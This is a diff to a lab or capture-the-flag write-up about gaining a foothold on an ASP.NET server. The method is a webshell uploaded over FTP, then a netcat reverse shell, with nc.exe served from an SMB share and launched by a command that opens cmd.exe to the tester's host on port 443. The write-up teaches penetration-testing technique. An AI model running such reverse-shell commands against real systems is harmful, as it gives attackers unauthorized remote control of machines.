@@ -74,7 +74,7 @@ Date: Wed, 23 Mar 2022 21:06:06 GMT
 
 Seeing that the server is running ASP.NET and I have access to FTP, I can probably upload a webshell
 
-## Foothold
+## Foothold w/o Metasploit
 
 ### Webshell
 
@@ -98,31 +98,27 @@ Here's what returns when entering `whoami`
 
 I'll be getting a shell with `nc.exe`
 
-First I use smbserver.py to send the executable to the web server and then execute a netcat command
+I use impacket-smbserver to host a windows netcat executable to then execute a connection to my kali machine
 
-![](<../../../../.gitbook/assets/image (26) (1).png>)
-
-![](<../../../../.gitbook/assets/image (41).png>)
-
-![](<../../../../.gitbook/assets/image (43) (1).png>)
+![](../../../../.gitbook/assets/image.png)
 
 I also start a nc listener on my kali machine to catch a shell
 
-![](<../../../../.gitbook/assets/image (31).png>)
+![](<../../../../.gitbook/assets/image (2).png>)
 
 Entering the following command into the webshell:
 
 ```
-\\10.10.14.13\nc.exe -e cmd.exe 10.10.14.13 443
+\\10.10.14.3\share\nc.exe -e cmd.exe 10.10.14.3 443
 ```
+
+![](<../../../../.gitbook/assets/image (3).png>)
 
 And I get a shell!
 
-{% hint style="warning" %}
-I was supposed to, but it didn't work. I followed along other manual methods but no success
-{% endhint %}
+![](<../../../../.gitbook/assets/image (1).png>)
 
-## With Metasploit
+## Foothold w/ Metasploit
 
 I'll create the payload
 
